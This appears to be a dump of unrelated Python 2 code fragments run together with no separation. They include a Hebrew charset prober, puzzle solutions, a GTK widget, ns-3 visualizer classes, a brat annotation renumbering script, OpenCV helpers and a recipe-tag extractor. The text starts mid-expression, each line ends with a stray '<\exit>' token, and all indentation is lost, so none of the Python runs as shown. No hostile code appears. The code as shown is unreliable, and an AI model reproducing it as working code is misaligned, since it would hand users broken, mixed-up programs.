- self._mVisualProber.get_confidence())<\exit>
if modelsub > MIN_MODEL_DISTANCE:<\exit>
return LOGICAL_HEBREW_NAME<\exit>
if modelsub < -MIN_MODEL_DISTANCE:<\exit>
return VISUAL_HEBREW_NAME<\exit>
if finalsub < 0.0:<\exit>
return VISUAL_HEBREW_NAME<\exit>
return LOGICAL_HEBREW_NAME<\exit>
def get_state(self):<\exit>
if (self._mLogicalProber.get_state() == eNotMe) and \<\exit>
(self._mVisualProber.get_state() == eNotMe):<\exit>
return eNotMe<\exit>
return eDetecting<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.delta = [(0, 1), (1, 0), (1, -1)]<\exit>
def solve(self, cipher):<\exit>
ret = self.rec(cipher)<\exit>
if ret:<\exit>
return "YES"<\exit>
else:<\exit>
return "NO"<\exit>
def rec(self, grid):<\exit>
changed = False<\exit>
m = len(grid)<\exit>
n = len(grid[0])<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if not changed:<\exit>
if grid[i][j] == 0:<\exit>
changed = True<\exit>
grid[i][j] = 1<\exit>
for d in self.delta:<\exit>
i2 = i + d[0]<\exit>
j2 = j + d[1]<\exit>
if 0 <= i2 < m and 0 <= j2 < n and grid[i2][j2] == 0:<\exit>
grid[i2][j2] = 1<\exit>
if self.rec(grid):<\exit>
return True<\exit>
grid[i2][j2] = 0<\exit>
grid[i][j] = 0<\exit>
if not changed:<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
int(f.readline().strip())<\exit>
cipher = []<\exit>
for _ in xrange(2):<\exit>
cipher.append(map(int, list(f.readline().strip())))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import gtk<\exit>
import gobject<\exit>
try:<\exit>
from gazpacho.widgets.base.base import SimpleContainerAdaptor<\exit>
except ImportError:<\exit>
pass<\exit>
class HIGContainer(gtk.Bin):<\exit>
__gtype_name__ = 'HIGContainer'<\exit>
__gproperties__ = {<\exit>
'title': (str, 'Group Title', 'the group title',<\exit>
'', gobject.PARAM_READWRITE|gobject.PARAM_CONSTRUCT),<\exit>
}<\exit>
def __init__(self, title=None):<\exit>
self.__title_text = None<\exit>
gtk.widget_push_composite_child()<\exit>
self.__title = gobject.new(gtk.Label, visible=True, xalign=0, yalign=0.5)<\exit>
self.__indent = gobject.new(gtk.Label, visible=True, label='    ')<\exit>
gtk.widget_pop_composite_child()<\exit>
gtk.Bin.__init__(self)<\exit>
self.__title.set_parent(self)<\exit>
self.__indent.set_parent(self)<\exit>
if title is not None:<\exit>
self.props.title = title<\exit>
def do_size_request(self, requisition):<\exit>
title_req = gtk.gdk.Rectangle(0, 0, *self.__title.size_request())<\exit>
indent_req = gtk.gdk.Rectangle(0, 0, *self.__indent.size_request())<\exit>
if self.child is None:<\exit>
child_req = gtk.gdk.Rectangle()<\exit>
else:<\exit>
child_req = gtk.gdk.Rectangle(0, 0, *self.child.size_request())<\exit>
requisition.height = (title_req.height + 6 +<\exit>
max(child_req.height, indent_req.height))<\exit>
requisition.width = max(title_req.width, indent_req.width + child_req.width)<\exit>
def do_size_allocate(self, allocation):<\exit>
self.allocation = allocation<\exit>
title_req = gtk.gdk.Rectangle(0, 0, *self.__title.get_child_requisition())<\exit>
title_alloc = gtk.gdk.Rectangle()<\exit>
title_alloc.x = allocation.x<\exit>
title_alloc.y = allocation.y<\exit>
title_alloc.width = min(title_req.width, allocation.width)<\exit>
title_alloc.height = min(title_req.height, allocation.height)<\exit>
self.__title.size_allocate(title_alloc)<\exit>
if self.child is None:<\exit>
return<\exit>
indent_req = gtk.gdk.Rectangle(0, 0, *self.__indent.get_child_requisition())<\exit>
child_req = gtk.gdk.Rectangle(0, 0, *self.child.get_child_requisition())<\exit>
child_alloc = gtk.gdk.Rectangle()<\exit>
child_alloc.x = allocation.x + indent_req.width<\exit>
child_alloc.y = allocation.y + title_alloc.height + 6<\exit>
child_alloc.width = allocation.width - indent_req.width<\exit>
child_alloc.height = allocation.height - 6 - title_alloc.height<\exit>
self.child.size_allocate(child_alloc)<\exit>
def do_forall(self, internal, callback, data):<\exit>
if internal:<\exit>
callback(self.__title, data)<\exit>
callback(self.__indent, data)<\exit>
if self.child is not None:<\exit>
callback(self.child, data)<\exit>
def do_set_property(self, pspec, value):<\exit>
if pspec.name == 'title':<\exit>
self.__title.set_markup('<span weight="bold">%s</span>' %<\exit>
gobject.markup_escape_text(value))<\exit>
self.__title_text = value<\exit>
else:<\exit>
raise AttributeError, 'unknown property %s' % pspec.name<\exit>
def do_get_property(self, pspec):<\exit>
if pspec.name == 'title':<\exit>
return self.__title_text<\exit>
else:<\exit>
raise AttributeError, 'unknown property %s' % pspec.name<\exit>
if __name__ == '__main__':<\exit>
frame = gtk.Frame()<\exit>
group = gobject.new(HIGContainer, title="Hello")<\exit>
frame.add(group)<\exit>
check = gtk.CheckButton("foobar")<\exit>
group.add(check)<\exit>
w = gtk.Window()<\exit>
w.add(frame)<\exit>
w.show_all()<\exit>
w.connect("destroy", lambda w: gtk.main_quit())<\exit>
gtk.main()<\exit>
HOOKS = ['response']<\exit>
def default_hooks():<\exit>
hooks = {}<\exit>
for event in HOOKS:<\exit>
hooks[event] = []<\exit>
return hooks<\exit>
def dispatch_hook(key, hooks, hook_data):<\exit>
hooks = hooks or dict()<\exit>
if key in hooks:<\exit>
hooks = hooks.get(key)<\exit>
if hasattr(hooks, '__call__'):<\exit>
hooks = [hooks]<\exit>
for hook in hooks:<\exit>
_hook_data = hook(hook_data)<\exit>
if _hook_data is not None:<\exit>
hook_data = _hook_data<\exit>
return hook_data<\exit>
import goocanvas<\exit>
import core<\exit>
import math<\exit>
import pango<\exit>
import gtk<\exit>
class Axes(object):<\exit>
def __init__(self, viz):<\exit>
self.viz = viz<\exit>
self.color = 0x8080C0FF<\exit>
self.hlines = goocanvas.Path(parent=viz.canvas.get_root_item(), stroke_color_rgba=self.color)<\exit>
self.hlines.lower(None)<\exit>
self.vlines = goocanvas.Path(parent=viz.canvas.get_root_item(), stroke_color_rgba=self.color)<\exit>
self.vlines.lower(None)<\exit>
self.labels = []<\exit>
hadj = self.viz.get_hadjustment()<\exit>
vadj = self.viz.get_vadjustment()<\exit>
def update(adj):<\exit>
if self.visible:<\exit>
self.update_view()<\exit>
hadj.connect("value-changed", update)<\exit>
vadj.connect("value-changed", update)<\exit>
hadj.connect("changed", update)<\exit>
vadj.connect("changed", update)<\exit>
self.visible = True<\exit>
self.update_view()<\exit>
def set_visible(self, visible):<\exit>
self.visible = visible<\exit>
if self.visible:<\exit>
self.hlines.props.visibility = goocanvas.ITEM_VISIBLE<\exit>
self.vlines.props.visibility = goocanvas.ITEM_VISIBLE<\exit>
else:<\exit>
self.hlines.props.visibility = goocanvas.ITEM_HIDDEN<\exit>
self.vlines.props.visibility = goocanvas.ITEM_HIDDEN<\exit>
for label in self.labels:<\exit>
label.props.visibility = goocanvas.ITEM_HIDDEN<\exit>
def _compute_divisions(self, xi, xf):<\exit>
assert xf > xi<\exit>
dx = xf - xi<\exit>
size = dx<\exit>
ndiv = 5<\exit>
text_width = dx/ndiv/2<\exit>
def rint(x):<\exit>
return math.floor(x+0.5)<\exit>
dx_over_ndiv = dx / ndiv<\exit>
for n in range(5):<\exit>
tbe = math.log10(dx_over_ndiv)<\exit>
div = pow(10, rint(tbe))<\exit>
if math.fabs(div/2 - dx_over_ndiv) < math.fabs(div - dx_over_ndiv):<\exit>
div /= 2<\exit>
elif math.fabs(div*2 - dx_over_ndiv) < math.fabs(div - dx_over_ndiv):<\exit>
div *= 2<\exit>
x0 = div*math.ceil(xi / div) - div<\exit>
if n > 1:<\exit>
ndiv = rint(size / text_width)<\exit>
return x0, div<\exit>
def update_view(self):<\exit>
if self.viz.zoom is None:<\exit>
return<\exit>
unused_labels = self.labels<\exit>
self.labels = []<\exit>
for label in unused_labels:<\exit>
label.set_property("visibility", goocanvas.ITEM_HIDDEN)<\exit>
def get_label():<\exit>
try:<\exit>
label = unused_labels.pop(0)<\exit>
except IndexError:<\exit>
label = goocanvas.Text(parent=self.viz.canvas.get_root_item(), stroke_color_rgba=self.color)<\exit>
else:<\exit>
label.set_property("visibility", goocanvas.ITEM_VISIBLE)<\exit>
label.lower(None)<\exit>
self.labels.append(label)<\exit>
return label<\exit>
hadj = self.viz.get_hadjustment()<\exit>
vadj = self.viz.get_vadjustment()<\exit>
zoom = self.viz.zoom.value<\exit>
offset = 10/zoom<\exit>
x1, y1 = self.viz.canvas.convert_from_pixels(hadj.value, vadj.value)<\exit>
x2, y2 = self.viz.canvas.convert_from_pixels(hadj.value + hadj.page_size, vadj.value + vadj.page_size)<\exit>
line_width = 5.0/self.viz.zoom.value<\exit>
self.hlines.set_property("line-width", line_width)<\exit>
yc = y2 - line_width/2<\exit>
sim_x1 = x1/core.PIXELS_PER_METER<\exit>
sim_x2 = x2/core.PIXELS_PER_METER<\exit>
x0, xdiv = self._compute_divisions(sim_x1, sim_x2)<\exit>
path = ["M %r %r L %r %r" % (x1, yc, x2, yc)]<\exit>
x = x0<\exit>
while x < sim_x2:<\exit>
path.append("M %r %r L %r %r" % (core.PIXELS_PER_METER*x, yc - offset, core.PIXELS_PER_METER*x, yc))<\exit>
label = get_label()<\exit>
label.set_properties(font=("Sans Serif %f" % int(12/zoom)),<\exit>
text=("%G" % x),<\exit>
fill_color_rgba=self.color,<\exit>
alignment=pango.ALIGN_CENTER,<\exit>
anchor=gtk.ANCHOR_S,<\exit>
x=core.PIXELS_PER_METER*x,<\exit>
y=(yc - offset))<\exit>
x += xdiv<\exit>
del x<\exit>
self.hlines.set_property("data", " ".join(path))<\exit>
self.vlines.set_property("line-width", line_width)<\exit>
xc = x1 + line_width/2<\exit>
sim_y1 = y1/core.PIXELS_PER_METER<\exit>
sim_y2 = y2/core.PIXELS_PER_METER<\exit>
y0, ydiv = self._compute_divisions(sim_y1, sim_y2)<\exit>
path = ["M %r %r L %r %r" % (xc, y1, xc, y2)]<\exit>
y = y0<\exit>
while y < sim_y2:<\exit>
path.append("M %r %r L %r %r" % (xc, core.PIXELS_PER_METER*y, xc + offset, core.PIXELS_PER_METER*y))<\exit>
label = get_label()<\exit>
label.set_properties(font=("Sans Serif %f" % int(12/zoom)),<\exit>
text=("%G" % y),<\exit>
fill_color_rgba=self.color,<\exit>
alignment=pango.ALIGN_LEFT,<\exit>
anchor=gtk.ANCHOR_W,<\exit>
x=xc + offset,<\exit>
y=core.PIXELS_PER_METER*y)<\exit>
y += ydiv<\exit>
self.vlines.set_property("data", " ".join(path))<\exit>
self.labels.extend(unused_labels)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
M, N, C = cipher<\exit>
hash_map = {}<\exit>
for ind, val in enumerate(C):<\exit>
if val in hash_map:<\exit>
hash_map[val].append(ind)<\exit>
else:<\exit>
hash_map[val] = [ind]<\exit>
for ind, val in enumerate(C):<\exit>
target = M - val<\exit>
if target in hash_map:<\exit>
i = 0<\exit>
while i < len(hash_map[target]) and hash_map[target][i] <= ind:<\exit>
i += 1<\exit>
if i != len(hash_map[target]):<\exit>
return "%d %d" % (ind + 1, hash_map[target][i] + 1)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
M = int(f.readline().strip())<\exit>
N = int(f.readline().strip())<\exit>
C = map(int, f.readline().strip().split(' '))<\exit>
cipher = M, N, C<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
DEBUG = True<\exit>
class Annotation(object):<\exit>
def __init__(self, id_, type_):<\exit>
self.id_ = id_<\exit>
self.type_ = type_<\exit>
def map_ids(self, idmap):<\exit>
self.id_ = idmap[self.id_]<\exit>
class Textbound(Annotation):<\exit>
def __init__(self, id_, type_, offsets, text):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.offsets = offsets<\exit>
self.text = text<\exit>
def map_ids(self, idmap):<\exit>
Annotation.map_ids(self, idmap)<\exit>
def __str__(self):<\exit>
return "%s\t%s %s\t%s" % (self.id_, self.type_,<\exit>
' '.join(self.offsets), self.text)<\exit>
class ArgAnnotation(Annotation):<\exit>
def __init__(self, id_, type_, args):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.args = args<\exit>
def map_ids(self, idmap):<\exit>
Annotation.map_ids(self, idmap)<\exit>
mapped = []<\exit>
for arg in self.args:<\exit>
key, value = arg.split(':')<\exit>
value = idmap[value]<\exit>
mapped.append("%s:%s" % (key, value))<\exit>
self.args = mapped<\exit>
class Relation(ArgAnnotation):<\exit>
def __init__(self, id_, type_, args):<\exit>
ArgAnnotation.__init__(self, id_, type_, args)<\exit>
def map_ids(self, idmap):<\exit>
ArgAnnotation.map_ids(self, idmap)<\exit>
def __str__(self):<\exit>
return "%s\t%s %s" % (self.id_, self.type_, ' '.join(self.args))<\exit>
class Event(ArgAnnotation):<\exit>
def __init__(self, id_, type_, trigger, args):<\exit>
ArgAnnotation.__init__(self, id_, type_, args)<\exit>
self.trigger = trigger<\exit>
def map_ids(self, idmap):<\exit>
ArgAnnotation.map_ids(self, idmap)<\exit>
self.trigger = idmap[self.trigger]<\exit>
def __str__(self):<\exit>
return "%s\t%s:%s %s" % (self.id_, self.type_, self.trigger,<\exit>
' '.join(self.args))<\exit>
class Attribute(Annotation):<\exit>
def __init__(self, id_, type_, target, value):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.target = target<\exit>
self.value = value<\exit>
def map_ids(self, idmap):<\exit>
Annotation.map_ids(self, idmap)<\exit>
self.target = idmap[self.target]<\exit>
def __str__(self):<\exit>
return "%s\t%s %s%s" % (self.id_, self.type_, self.target,<\exit>
'' if self.value is None else ' '+self.value)<\exit>
class Normalization(Annotation):<\exit>
def __init__(self, id_, type_, target, ref, reftext):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.target = target<\exit>
self.ref = ref<\exit>
self.reftext = reftext<\exit>
def map_ids(self, idmap):<\exit>
Annotation.map_ids(self, idmap)<\exit>
self.target = idmap[self.target]<\exit>
def __str__(self):<\exit>
return "%s\t%s %s %s\t%s" % (self.id_, self.type_, self.target,<\exit>
self.ref, self.reftext)<\exit>
class Equiv(Annotation):<\exit>
def __init__(self, id_, type_, targets):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.targets = targets<\exit>
def map_ids(self, idmap):<\exit>
Annotation.map_ids(self, idmap)<\exit>
self.targets = [idmap[target] for target in self.targets]<\exit>
def __str__(self):<\exit>
return "%s\t%s %s" % (self.id_, self.type_, ' '.join(self.targets))<\exit>
class Note(Annotation):<\exit>
def __init__(self, id_, type_, target, text):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.target = target<\exit>
self.text = text<\exit>
def map_ids(self, idmap):<\exit>
Annotation.map_ids(self, idmap)<\exit>
self.target = idmap[self.target]<\exit>
def __str__(self):<\exit>
return "%s\t%s %s\t%s" % (self.id_, self.type_, self.target, self.text)<\exit>
def parse_textbound(fields):<\exit>
id_, type_offsets, text = fields<\exit>
type_offsets = type_offsets.split(' ')<\exit>
type_, offsets = type_offsets[0], type_offsets[1:]<\exit>
return Textbound(id_, type_, offsets, text)<\exit>
def parse_relation(fields):<\exit>
id_, type_args = fields<\exit>
type_args = type_args.split(' ')<\exit>
type_, args = type_args[0], type_args[1:]<\exit>
return Relation(id_, type_, args)<\exit>
def parse_event(fields):<\exit>
id_, type_trigger_args = fields<\exit>
type_trigger_args = type_trigger_args.split(' ')<\exit>
type_trigger, args = type_trigger_args[0], type_trigger_args[1:]<\exit>
type_, trigger = type_trigger.split(':')<\exit>
args = [a for a in args if a]<\exit>
return Event(id_, type_, trigger, args)<\exit>
def parse_attribute(fields):<\exit>
id_, type_target_value = fields<\exit>
type_target_value = type_target_value.split(' ')<\exit>
if len(type_target_value) == 3:<\exit>
type_, target, value = type_target_value<\exit>
else:<\exit>
type_, target = type_target_value<\exit>
value = None<\exit>
return Attribute(id_, type_, target, value)<\exit>
def parse_normalization(fields):<\exit>
id_, type_target_ref, reftext = fields<\exit>
type_, target, ref = type_target_ref.split(' ')<\exit>
return Normalization(id_, type_, target, ref, reftext)<\exit>
def parse_note(fields):<\exit>
id_, type_target, text = fields<\exit>
type_, target = type_target.split(' ')<\exit>
return Note(id_, type_, target, text)<\exit>
def parse_equiv(fields):<\exit>
id_, type_targets = fields<\exit>
type_targets = type_targets.split(' ')<\exit>
type_, targets = type_targets[0], type_targets[1:]<\exit>
return Equiv(id_, type_, targets)<\exit>
parse_func = {<\exit>
'T': parse_textbound,<\exit>
'R': parse_relation,<\exit>
'E': parse_event,<\exit>
'N': parse_normalization,<\exit>
'M': parse_attribute,<\exit>
'A': parse_attribute,<\exit>
'#': parse_note,<\exit>
'*': parse_equiv,<\exit>
}<\exit>
def parse(l, ln):<\exit>
assert len(l) and l[0] in parse_func, "Error on line %d: %s" % (ln, l)<\exit>
try:<\exit>
return parse_func[l[0]](l.split('\t'))<\exit>
except Exception:<\exit>
assert False, "Error on line %d: %s" % (ln, l)<\exit>
def process(fn):<\exit>
idmap = {}<\exit>
with open(fn, "rU") as f:<\exit>
lines = [l.rstrip('\n') for l in f.readlines()]<\exit>
annotations = []<\exit>
for i, l in enumerate(lines):<\exit>
annotations.append(parse(l, i+1))<\exit>
if DEBUG:<\exit>
for i, a in enumerate(annotations):<\exit>
assert lines[i] == str(a), ("Cross-check failed:\n  "+<\exit>
'"%s"' % lines[i] + " !=\n  "+<\exit>
'"%s"' % str(a))<\exit>
idmap = {}<\exit>
next_free = {}<\exit>
idmap['*'] = '*'<\exit>
for i, a in enumerate(annotations):<\exit>
if a.id_ == '*':<\exit>
continue<\exit>
assert a.id_ not in idmap, "Dup ID on line %d: %s" % (i, l)<\exit>
prefix = a.id_[0]<\exit>
seq = next_free.get(prefix, 1)<\exit>
idmap[a.id_] = prefix+str(seq)<\exit>
next_free[prefix] = seq+1<\exit>
for i, a in enumerate(annotations):<\exit>
a.map_ids(idmap)<\exit>
print(a)<\exit>
def main(argv):<\exit>
if len(argv) < 2:<\exit>
print >> sys.stderr, "Usage:", argv[0], "FILE [FILE ...]"<\exit>
return 1<\exit>
for fn in argv[1:]:<\exit>
process(fn)<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import cv2<\exit>
import numpy as np<\exit>
def imshow(mat, img_name="Image Name"):<\exit>
cv2.imshow(img_name, mat)<\exit>
cv2.waitKey(0)<\exit>
cv2.destroyAllWindows()<\exit>
def random_img(size=(400, 400)):<\exit>
mat = np.random.randint(0, 255, size)<\exit>
mat = np.asarray(mat, dtype=np.int8)<\exit>
return mat<\exit>
def blurred_img(size=(400, 400)):<\exit>
mat = random_img(size)<\exit>
kernel = cv2.getGaussianKernel(129, 7)<\exit>
mat = cv2.filter2D(mat, cv2.CV_8UC3, kernel)<\exit>
mat = np.asarray(mat, dtype=np.int8)<\exit>
return mat<\exit>
if __name__ == "__main__":<\exit>
imshow(random_img())<\exit>
imshow(blurred_img())<\exit>
class TreeNode:<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.left, self.right = None, None<\exit>
class Solution:<\exit>
def __init__(self, root):<\exit>
self.stk = []<\exit>
self.cur = root<\exit>
def hasNext(self):<\exit>
return self.cur or self.stk<\exit>
def next(self):<\exit>
if not self.hasNext():<\exit>
return None<\exit>
while self.cur:<\exit>
self.stk.append(self.cur)<\exit>
self.cur = self.cur.left<\exit>
node = self.stk.pop()<\exit>
self.cur = node.right<\exit>
return node<\exit>
class Queue:<\exit>
def __init__(self):<\exit>
self.in_stk = []<\exit>
self.out_stk = []<\exit>
def push(self, element):<\exit>
self.in_stk.append(element)<\exit>
def top(self):<\exit>
if not self.out_stk:<\exit>
while self.in_stk:<\exit>
self.out_stk.append(self.in_stk.pop())<\exit>
return self.out_stk[-1]<\exit>
def pop(self):<\exit>
if not self.out_stk:<\exit>
while self.in_stk:<\exit>
self.out_stk.append(self.in_stk.pop())<\exit>
return self.out_stk.pop()<\exit>
import os<\exit>
import re<\exit>
class InfoExtraction(object):<\exit>
def __init__(self):<\exit>
self.p_amount = "<Amount>(?P<amount>[^<]+)</Amount>"<\exit>
self.p_ingredient = "<Ingredient>(?P<ingredient>[^<]+)</Ingredient>"<\exit>
self.p_unit = "<Unit>(?P<unit>[^<]+)</Unit>"<\exit>
self.p_recipe = "<Recipe>(?P<recipe>[^<]+)</Recipe>"<\exit>
def extract_directory(self, top, func_name, callback=None):<\exit>
for root, dirs, files in os.walk(top):<\exit>
for file_name in files:<\exit>
if file_name.endswith(".xml"):<\exit>
if not callback:<\exit>
self.extract_file(os.path.join(root, file_name), func_name)<\exit>
else:<\exit>
callback(self.extract_file(os.path.join(root, file_name), func_name))<\exit>
def extract_file(self, file_path, func_name):<\exit>
import codecs<\exit>
with codecs.open(file_path, 'r') as tagged_file:<\exit>
content = tagged_file.read()<\exit>
content = self.pre_format(content)<\exit>
if func_name=="relation":<\exit>
return self.extract_relation(content)<\exit>
elif func_name=="set":<\exit>
return self.extract_set(content)<\exit>
else:<\exit>
print "Error: func_name should one from [set, relation"<\exit>
def extract_relation(self, content):<\exit>
p1 = re.compile("[^<]{0,50}".join([self.p_amount, self.p_ingredient]))<\exit>
p2 = re.compile("[^<]{0,50}".join([self.p_amount, self.p_unit, self.p_ingredient]))<\exit>
p3 = re.compile("[^<]{0,10}".join([self.p_amount, "<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))<\exit>
p4 = re.compile("[^<]{0,10}".join([self.p_amount, "<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))<\exit>
p5 = re.compile("[^<]{0,10}".join([self.p_amount, "<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))<\exit>
p6 = re.compile("[^<]{0,10}".join([self.p_amount, self.p_unit,"<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))<\exit>
p7 = re.compile("[^<]{0,10}".join([self.p_amount, self.p_unit,"<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))<\exit>
p8 = re.compile("[^<]{0,10}".join([self.p_amount, self.p_unit,"<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))<\exit>
patterns = [p1,p2,p3,p4,p5,p6,p7,p8]<\exit>
result_set = set()<\exit>
for p in patterns:<\exit>
mg = p.finditer(content.decode("utf-8"))<\exit>
for m in mg:<\exit>
result_set.add(str(m.groupdict()).decode("utf-8"))<\exit>
return result_set<\exit>
def extract_set(self, content):<\exit>
tag_regex = dict()<\exit>
tag_regex['recipe']=re.compile(self.p_recipe)<\exit>
tag_regex['ingredient']=re.compile(self.p_ingredient)<\exit>
tag_regex['unit']=re.compile(self.p_unit)<\exit>
tag_regex['amount']=re.compile(self.p_amount)<\exit>
set_group = dict()<\exit>
for tag,tag_re in tag_regex.items():<\exit>
result = tag_re.findall(content)<\exit>
set_group[tag] = set(result)<\exit>
return set_group<\exit>
def pre_format(self, content):<\exit>
content = re.sub("<entity type=\"(\w+)\">([^<]+)</entity>", "<\g<1>>\g<2></\g<1>>", content)<\exit>
content = content.replace("<s>", "")<\exit>
content = content.replace("</B-Ingredient> <I-Ingredient>", " ")<\exit>
content = content.replace("</I-Ingredient> <I-Ingredient>", " ")<\exit>
content = content.replace("</B-Recipe> <I-Recipe>", " ")<\exit>
content = content.replace("</I-Recipe> <I-Recipe>", " ")<\exit>
content = content.replace("</B-Amount> <I-Amount>", " ")<\exit>
content = content.replace("</I-Amount> <I-Amount>", " ")<\exit>
content = content.replace("</B-Unit> <I-Unit>", " ")<\exit>
content = content.replace("</I-Unit> <I-Unit>", " ")<\exit>
content = content.replace("</I-", "</")<\exit>
content = content.replace("</B-", "</")<\exit>
content = content.replace("<B-", "<")<\exit>
content = content.replace("<I-", "<")<\exit>
return content<\exit>
if __name__ == '__main__':<\exit>
info_extraction = InfoExtraction()<\exit>
current_directory = os.path.dirname(os.path.realpath(__file__))<\exit>
current_directory = os.path.join(current_directory)<\exit>
info_extraction.extract_directory(current_directory, "relation")<\exit>
class TreeNode:<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.left, self.right = None, None<\exit>
class Solution:<\exit>
def insertNode(self, root, node):<\exit>
cur = root<\exit>
if not root:<\exit>
root = node<\exit>
return root<\exit>
while cur:<\exit>
if cur.val == node.val:<\exit>
return root<\exit>
elif cur.val > node.val:<\exit>
if cur.left:<\exit>
cur = cur.left<\exit>
else:<\exit>
cur.left = node<\exit>
return root<\exit>
else:<\exit>
if cur.right:<\exit>
cur = cur.right<\exit>
else:<\exit>
cur.right = node<\exit>
return root<\exit>
import copy_reg<\exit>
import types<\exit>
def reduce_method(m):<\exit>
return (getattr, (m.__self__, m.__func__.__name__))<\exit>
copy_reg.pickle(types.MethodType, reduce_method)<\exit>
import gtk<\exit>
import ns.core<\exit>
import ns.network<\exit>
from visualizer.base import InformationWindow<\exit>
NODE_STATISTICS_MEMORY = 10<\exit>
class StatisticsCollector(object):<\exit>
class NetDevStats(object):<\exit>
__slots__ = ['rxPackets', 'rxBytes', 'txPackets', 'txBytes',<\exit>
'rxPacketRate', 'rxBitRate', 'txPacketRate', 'txBitRate']<\exit>
def __init__(self, visualizer):<\exit>
self.node_statistics = {}<\exit>
self.visualizer = visualizer<\exit>
def simulation_periodic_update(self, viz):<\exit>
nodes_statistics = viz.simulation.sim_helper.GetNodesStatistics()<\exit>
for stats in nodes_statistics:<\exit>
try:<\exit>
raw_stats_list = self.node_statistics[stats.nodeId]<\exit>
except KeyError:<\exit>
raw_stats_list = []<\exit>
self.node_statistics[stats.nodeId] = raw_stats_list<\exit>
raw_stats_list.append(stats.statistics)<\exit>
while len(raw_stats_list) > NODE_STATISTICS_MEMORY:<\exit>
raw_stats_list.pop(0)<\exit>
def get_interface_statistics(self, nodeId):<\exit>
try:<\exit>
raw_stats_list = self.node_statistics[nodeId]<\exit>
except KeyError:<\exit>
return []<\exit>
if len(raw_stats_list) < NODE_STATISTICS_MEMORY:<\exit>
return []<\exit>
assert len(raw_stats_list) == NODE_STATISTICS_MEMORY<\exit>
tx_packets1 = []<\exit>
rx_packets1 = []<\exit>
tx_bytes1 = []<\exit>
rx_bytes1 = []<\exit>
for iface, stats in enumerate(raw_stats_list[0]):<\exit>
tx_packets1.append(stats.transmittedPackets)<\exit>
tx_bytes1.append(stats.transmittedBytes)<\exit>
rx_packets1.append(stats.receivedPackets)<\exit>
rx_bytes1.append(stats.receivedBytes)<\exit>
retval = []<\exit>
k = self.visualizer.sample_period*(NODE_STATISTICS_MEMORY-1)<\exit>
for iface, stats in enumerate(raw_stats_list[-1]):<\exit>
outStat = self.NetDevStats()<\exit>
outStat.txPackets = stats.transmittedPackets<\exit>
outStat.txBytes = stats.transmittedBytes<\exit>
outStat.rxPackets = stats.receivedPackets<\exit>
outStat.rxBytes = stats.receivedBytes<\exit>
outStat.txPacketRate = (stats.transmittedPackets - tx_packets1[iface])/k<\exit>
outStat.rxPacketRate = (stats.receivedPackets - rx_packets1[iface])/k<\exit>
outStat.txBitRate = (stats.transmittedBytes - tx_bytes1[iface])*8/k<\exit>
outStat.rxBitRate = (stats.receivedBytes - rx_bytes1[iface])*8/k<\exit>
retval.append(outStat)<\exit>
return retval<\exit>
class ShowInterfaceStatistics(InformationWindow):<\exit>
(<\exit>
COLUMN_INTERFACE,<\exit>
COLUMN_TX_PACKETS,<\exit>
COLUMN_TX_BYTES,<\exit>
COLUMN_TX_PACKET_RATE,<\exit>
COLUMN_TX_BIT_RATE,<\exit>
COLUMN_RX_PACKETS,<\exit>
COLUMN_RX_BYTES,<\exit>
COLUMN_RX_PACKET_RATE,<\exit>
COLUMN_RX_BIT_RATE,<\exit>
) = range(9)<\exit>
def __init__(self, visualizer, node_index, statistics_collector):<\exit>
InformationWindow.__init__(self)<\exit>
self.win = gtk.Dialog(parent=visualizer.window,<\exit>
flags=gtk.DIALOG_DESTROY_WITH_PARENT|gtk.DIALOG_NO_SEPARATOR,<\exit>
buttons=(gtk.STOCK_CLOSE, gtk.RESPONSE_CLOSE))<\exit>
self.win.connect("response", self._response_cb)<\exit>
self.win.set_title("Statistics for node %i" % node_index)<\exit>
self.visualizer = visualizer<\exit>
self.statistics_collector = statistics_collector<\exit>
self.node_index = node_index<\exit>
self.viz_node = visualizer.get_node(node_index)<\exit>
self.table_model = gtk.ListStore(*([str]*13))<\exit>
treeview = gtk.TreeView(self.table_model)<\exit>
treeview.show()<\exit>
self.win.vbox.add(treeview)<\exit>
def add_column(descr, colid):<\exit>
column = gtk.TreeViewColumn(descr, gtk.CellRendererText(), text=colid)<\exit>
treeview.append_column(column)<\exit>
add_column("Interface", self.COLUMN_INTERFACE)<\exit>
add_column("Tx Packets", self.COLUMN_TX_PACKETS)<\exit>
add_column("Tx Bytes", self.COLUMN_TX_BYTES)<\exit>
add_column("Tx pkt/1s", self.COLUMN_TX_PACKET_RATE)<\exit>
add_column("Tx bit/1s", self.COLUMN_TX_BIT_RATE)<\exit>
add_column("Rx Packets", self.COLUMN_RX_PACKETS)<\exit>
add_column("Rx Bytes", self.COLUMN_RX_BYTES)<\exit>
